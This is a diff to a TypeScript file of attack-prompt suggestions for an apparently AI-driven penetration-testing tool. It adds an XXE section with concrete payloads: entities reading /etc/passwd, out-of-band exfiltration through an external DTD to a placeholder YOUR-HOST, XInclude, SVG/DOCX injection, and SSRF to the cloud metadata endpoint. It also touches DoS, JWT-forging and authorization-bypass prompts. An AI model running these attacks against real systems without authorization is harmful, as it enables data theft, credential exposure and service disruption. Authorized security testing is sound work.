@@ -230,7 +230,7 @@ export const EXPLOITATION_GROUPS: SESubGroup[] = [
       {
         suggestions: [
           { label: 'Test service availability (auto-select best vector)', prompt: 'Perform an availability test against the target. Analyze the discovered services and vulnerabilities from the graph, select the most effective test vector (known CVE, HTTP application, Layer 4 flood, or application logic), execute the test, and verify the service impact.' },
-          { label: 'Test web server resilience', prompt: 'Test the web server resilience on the target. Choose the best approach based on the server type and version — try slowloris, slow POST, known CVE modules, or crafted crash requests. Verify the service impact.' },
+          { label: 'Test web server resilience', prompt: 'Test the web server resilience on the target. Choose the best approach based on the server type and version - try slowloris, slow POST, known CVE modules, or crafted crash requests. Verify the service impact.' },
           { label: 'Stress test target service availability', prompt: 'Test the resilience of the target service to availability disruption. Try multiple test vectors (up to the configured max attempts), document which ones succeed and which fail, and report whether the service is resilient or vulnerable.' },
         ],
       },
@@ -308,6 +308,22 @@ export const EXPLOITATION_GROUPS: SESubGroup[] = [
           { label: 'Forced browsing to hidden admin functions', prompt: 'Enumerate privileged/admin endpoints with execute_ffuf against SecLists Discovery/Web-Content wordlists, diffing status/length against a known-denied baseline; mine client JS with execute_jsluice and render with execute_playwright to surface endpoints the UI hides. Then call each privileged function as a low/no-privilege principal and diff to confirm missing function-level authorization.' },
           { label: 'Tamper client-side role / hidden fields', prompt: 'Run execute_arjun to discover hidden parameters (role, isAdmin, uid, debug), then use execute_curl to flip role/flag/level values in query strings, cookies, hidden form fields, and JSON bodies and diff the response toward privileged access. Test mass assignment by adding fields the API did not send you (role, owner, isVerified) to update/create bodies.' },
           { label: 'Attack a JWT / session token', prompt: 'Decode the session/JWT with execute_code and inspect role/identity claims. Test alg:none (unsigned, signature stripped, plus mixed-case obfuscation), attempt an offline weak-secret crack with jwt_tool or hashcat mode 16500 via kali_shell, test RS->HS key confusion and kid handling, then forge a privileged claim and diff the authorized response. For plain role cookies, tamper the value directly.' },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'xxe',
+    title: 'XML External Entity (XXE)',
+    items: [
+      {
+        suggestions: [
+          { label: 'Find and probe the XML attack surface', prompt: 'Enumerate every endpoint that parses XML: SOAP / XML-RPC / REST-that-takes-XML, any .wsdl or ?wsdl artifact, and file uploads that accept SVG / DOCX / XLSX / SAML. With execute_curl, POST a minimal well-formed XML document (Content-Type: application/xml) to each candidate and read the response and error text to confirm which endpoint parses XML and which element names it expects. Authenticate first if the endpoint sits behind a login.' },
+          { label: 'Confirm entity processing then read a file (in-band)', prompt: 'On the XML-parsing endpoint, first send a CONTROL internal entity (<!DOCTYPE r [ <!ENTITY probe "MARKER"> ]><r><field>&probe;</field></r>) and diff the response to prove entity substitution is on. Then swap to an external SYSTEM entity pointing at file:///etc/hostname referenced in a reflected field; once proven, enumerate and read the objective file. Build the bodies with execute_code so the & and % characters survive.' },
+          { label: 'Blind XXE: out-of-band exfiltration via external DTD', prompt: 'When nothing is reflected, stand up a listener (interactsh, or python3 -m http.server on kali via job_spawn), then send a client body referencing your external DTD (<!DOCTYPE r SYSTEM "http://YOUR-HOST/oob.dtd">) whose DTD defines a parameter entity that reads file:///etc/passwd and appends it to a callback URL. Read the exfiltrated data from your listener log; wrap the source in php://filter base64 or use an ftp:// callback for multi-line files.' },
+          { label: 'Error-based XXE via a local system DTD (no egress)', prompt: 'If the target cannot reach your callback, use error-based exfiltration through an on-target DTD: reference file:///usr/share/xml/fontconfig/fonts.dtd, redefine a parameter entity to embed file:///etc/passwd into a nonexistent-file path, and read the file contents from the resulting parse-error message. Craft the nested parameter-entity payload with execute_code and send via execute_curl.' },
+          { label: 'Deliver XXE by switching content-type or via XInclude', prompt: 'If the endpoint takes JSON or form data, re-send the request with Content-Type: application/xml and an equivalent XML body carrying the DOCTYPE + external entity. If the DOCTYPE is stripped but you control a value inside server-composed XML, use XInclude instead: <r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></r>.' },
+          { label: 'XXE via file upload (SVG / OOXML) and SSRF via entities', prompt: 'For an upload that accepts SVG, embed a DOCTYPE with an external entity and reference it in a <text> element (works when the app rasterizes or echoes the SVG). For DOCX/XLSX, unzip with kali_shell (7z x), inject an external-DTD OOB payload into word/document.xml or xl/workbook.xml, rezip and upload. To pivot to SSRF, point the entity at http://169.254.169.254/latest/meta-data/ or an internal service and read the reflected or exfiltrated response.' },
         ],
       },
     ],
